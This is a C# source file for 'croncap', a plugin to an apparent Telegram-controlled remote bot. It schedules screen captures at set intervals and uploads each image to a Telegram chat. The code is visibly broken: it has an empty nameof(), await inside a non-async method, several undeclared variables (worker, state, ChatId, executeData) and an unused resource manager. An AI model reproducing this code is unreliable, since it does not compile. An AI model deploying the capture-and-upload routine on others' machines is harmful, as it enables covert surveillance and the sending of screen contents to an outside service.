using CommandLine;
using Sdk.Base;
using Sdk.Models;
using System.Resources;
using Telebot.Capture;

namespace croncap
{
    [Verb("croncap", HelpText = "Schedules screen capture session.")]
    public class DllMain : Plugin
    {
        [Option("total", HelpText = "The total amount of time in seconds to run the cron")]
        public int Total { get; set; }

        [Option("timeout", HelpText = "The timeout in seconds between each execution")]
        public int Timeout { get; set; }

        [Option("stop", HelpText = "Sends a signal to cancel execution")]
        public bool Cancel { get; set; }

        private readonly string _name;
        private readonly ResourceManager _rm;

        public DllMain()
        {
            this._name = nameof();
            this._rm = new ResourceManager(typeof(DllMain));
        }

        public override void Execute()
        {
            if (this.Cancel)
            {
                this.ExecuteResultCallback(
                    new ExecuteResult()
                    {
                        StatusText = $"croncap has been cancelled.",
                        Success = true
                    }
                );

                worker.Stop();

                return;
            }

            var args = state.Split(' ');

            int duration = Convert.ToInt32(args[0]);
            int interval = Convert.ToInt32(args[1]);

            string text = "";

            await BotClient.SendTextMessageAsync(
                ChatId, text, replyToMessageId: executeData.FromMessageId
            );

            ((IScheduled)worker).Start(duration, interval);
        }

        private async void UpdateHandler(object sender, CaptureArgs e)
        {
            var raw = new InputOnlineFile(e.Capture.ToMemStream(), "preview.jpg");
            await BotClient.SendDocumentAsync(ChatId, raw);
        }

        private async void FeedbackHandler(object sender, Feedback e)
        {
            await BotClient.SendTextMessageAsync(ChatId, e.Text);
        }

        public override void Initialize(ModuleData moduleData)
        {
            base.Initialize(moduleData);

            worker = new CaptureSchedule
            {
                Update = UpdateHandler,
                Feedback = FeedbackHandler
            };
        }

        public async Task<string> GetStatus()
        {
            return $"*Cap Time*: {worker.Active.ToReadable()}";
        }
    }
}
